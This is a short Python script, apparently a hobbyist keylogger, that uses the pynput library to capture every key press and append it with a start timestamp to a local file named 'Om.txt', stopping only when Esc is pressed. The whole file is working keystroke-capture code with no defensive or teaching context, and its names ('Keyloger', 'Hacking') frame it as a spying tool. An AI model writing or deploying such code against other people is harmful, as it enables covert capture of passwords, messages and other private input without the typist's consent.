from pynput.keyboard import Key,Listener
from datetime import datetime

LogFile = 'Om.txt'

def Timestamp():
    timestamp = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    with open(LogFile,'a') as File:
        File.write(f'Logging start at:{timestamp}\n')

def Keyloger(key):
    data =  str(key).replace("'","")

    if data == 'Key.space':
        data = ' '

    if data == 'Key.enter':
        data = '\n'

    with open(LogFile,'a') as File:
        File.write(data)

def start(key):
    Keyloger(key)

    if key == Key.esc:
        return False
    
Timestamp()

with Listener(on_press = start) as Hacking:
    Hacking.join()
